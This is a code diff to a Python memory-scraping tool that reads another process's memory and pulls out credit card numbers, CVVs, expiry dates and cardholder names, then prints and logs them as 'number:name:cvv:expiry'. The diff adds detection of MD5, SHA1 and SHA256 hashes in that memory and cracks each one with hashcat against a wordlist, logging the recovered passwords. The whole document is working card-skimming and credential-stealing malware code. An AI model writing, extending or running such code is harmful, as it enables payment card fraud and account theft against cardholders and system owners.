@@ -6,6 +6,8 @@ from queue import Queue
 import sys
 import time
 import logging
+import subprocess
+import os
 
 # Constants for process access
 PROCESS_VM_READ = 0x0010
@@ -30,13 +32,36 @@ def validate_luhn(card_number):
         total += n
     return total % 10 == 0
 
-# Improved regex patterns
+# Regex patterns
 cc_regex = re.compile(r'\b(?:\d[ -]*?){13,19}\b')  # Credit card number
 cvv_regex = re.compile(r'\b\d{3,4}\b')  # CVV code (3 or 4 digits)
 expiry_regex = re.compile(r'\b(0[1-9]|1[0-2])/(?:\d{2}|\d{4})\b')  # Expiry date MM/YY or MM/YYYY
 name_regex = re.compile(r'\b[A-Z][a-z]+ [A-Z][a-z]+\b')  # Simple name pattern (First Last)
+hash_regex = re.compile(r'\b[a-fA-F0-9]{32}\b|\b[a-fA-F0-9]{40}\b|\b[a-fA-F0-9]{64}\b')  # MD5, SHA1, SHA256
 
-# Scan a buffer for potential credit card data
+# Hashcat command for cracking hashes
+def crack_hash(hash_value):
+    # Save the hash to a temporary file for Hashcat
+    with open("hash.txt", "w") as f:
+        f.write(hash_value)
+
+    # Construct the command to run Hashcat
+    # You need to have Hashcat installed and in your PATH for this to work
+    command = ["hashcat", "-m", "0", "hash.txt", "path_to_your_wordlist.txt"]
+
+    # Run the command
+    try:
+        subprocess.run(command, check=True)
+        with open("hashcat.potfile", "r") as f:  # Check Hashcat's output
+            for line in f:
+                if hash_value in line:
+                    return line.split(":")[1]  # Return cracked password
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Error running Hashcat: {e}")
+    
+    return "Not Found"
+
+# Scan a buffer for potential credit card data and hashes
 def scan_memory_chunk(memory_chunk):
     results = []
     card_matches = cc_regex.findall(memory_chunk)
@@ -65,6 +90,15 @@ def scan_memory_chunk(memory_chunk):
                 'Name': name
             })
     
+    # Check for hashed values in the memory chunk
+    hash_matches = hash_regex.findall(memory_chunk)
+    for hash_match in hash_matches:
+        cracked_value = crack_hash(hash_match)
+        results.append({
+            'Hash': hash_match,
+            'Cracked Value': cracked_value
+        })
+
     return results
 
 # Worker thread that processes memory chunks
@@ -82,9 +116,14 @@ def memory_scan_worker(process_handle):
                 valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1', errors='ignore'))
                 if valid_cards:
                     for card in valid_cards:
-                        formatted_output = f"{card['Card Number']}:{card['Name']}:{card['CVV']}:{card['Expiry Date']}"
-                        print(formatted_output)
-                        logging.info(formatted_output)  # Log to file
+                        if 'Card Number' in card:
+                            formatted_output = f"{card['Card Number']}:{card['Name']}:{card['CVV']}:{card['Expiry Date']}"
+                            print(formatted_output)
+                            logging.info(formatted_output)  # Log to file
+                        elif 'Hash' in card:
+                            formatted_output = f"Hash Found: {card['Hash']} - Cracked Value: {card['Cracked Value']}"
+                            print(formatted_output)
+                            logging.info(formatted_output)  # Log to file
         except Exception as e:
             logging.error(f"Error reading memory at {base_addr}: {e}")
         finally:
